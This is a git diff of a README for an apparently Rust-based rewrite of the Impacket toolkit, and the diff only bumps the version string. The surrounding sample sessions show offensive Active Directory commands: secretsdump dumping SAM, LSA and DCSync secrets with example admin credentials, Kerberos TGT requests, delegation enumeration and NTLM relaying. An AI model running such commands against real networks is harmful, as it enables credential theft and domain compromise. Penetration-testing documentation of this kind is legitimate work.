@@ -40,7 +40,7 @@
   <img src="assets/comparison-demo.svg" alt="Impacket-RS vs Python Impacket Benchmark" width="100%"/>
 </p>
 
-Benchmarks executed on Apple Silicon (M-series, 10-core) and Linux (AMD EPYC, 8-core) comparing Python 3.11 Impacket v0.12.0 against `impacket-rs` v0.1.0-dev (release build):
+Benchmarks executed on Apple Silicon (M-series, 10-core) and Linux (AMD EPYC, 8-core) comparing Python 3.11 Impacket v0.12.0 against `impacket-rs` v0.1.0 (release build):
 
 | Benchmark Metric | Python Impacket (v0.12.0) | Impacket-RS (Rust) | Speedup / Efficiency |
 | :--- | :---: | :---: | :---: |
@@ -62,7 +62,7 @@ Benchmarks executed on Apple Silicon (M-series, 10-core) and Linux (AMD EPYC, 8-
 ### 1. `secretsdump` (Remote SAM, LSA & Active Directory DCSync)
 ```text
 $ impacket-rs secretsdump corp.local/administrator:Password123@192.168.1.10
-Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
+Impacket-RS v0.1.0 - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
 [*] Target OS identified: Windows Server 2022 Datacenter (Build 20348)
 [*] Negotiated SMB Dialect: SMB 3.1.1 [AES-128-GCM / SHA-512 Preauth]
 [*] Service Remote Registry (winreg) started successfully via \PIPE\svcctl
@@ -80,7 +80,7 @@ NL$KM: 0x88e142c...
 ### 2. `getTGT` with FAST Armoring (RFC 6113)
 ```text
 $ impacket-rs getTGT -fast armor.ccache corp.local/svc_backup:BackupPass2025@192.168.1.5
-Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
+Impacket-RS v0.1.0 - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
 [*] Loading Kerberos FAST Armor from 'armor.ccache'...
 [*] Encapsulating AS-REQ inside PA-FX-FAST using PRF+ (AES-256) session subkey...
 [*] Sending armored AS-REQ to 192.168.1.5:88...
@@ -92,7 +92,7 @@ Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000
 ### 3. `findDelegation` with ASCII Trust Graphs
 ```text
 $ impacket-rs findDelegation -graph administrator:Pass@192.168.1.10
-Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
+Impacket-RS v0.1.0 - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
 [*] Connecting to LDAP on 192.168.1.10:389...
 [*] Scanning Active Directory for Kerberos Delegation configurations...
 
@@ -114,7 +114,7 @@ Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000
 ### 4. `ntlmrelayx` Multi-Target Relaying
 ```text
 $ impacket-rs ntlmrelayx -tf targets.txt -proto http
-Impacket-RS v0.1.0-dev - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
+Impacket-RS v0.1.0 - High-Performance Rust Network Protocol Toolkit (Win2000 -> Win2025)
 [*] Initializing NTLM Relay Engine...
   Listen Protocol : HTTP
   Listen Port     : 80
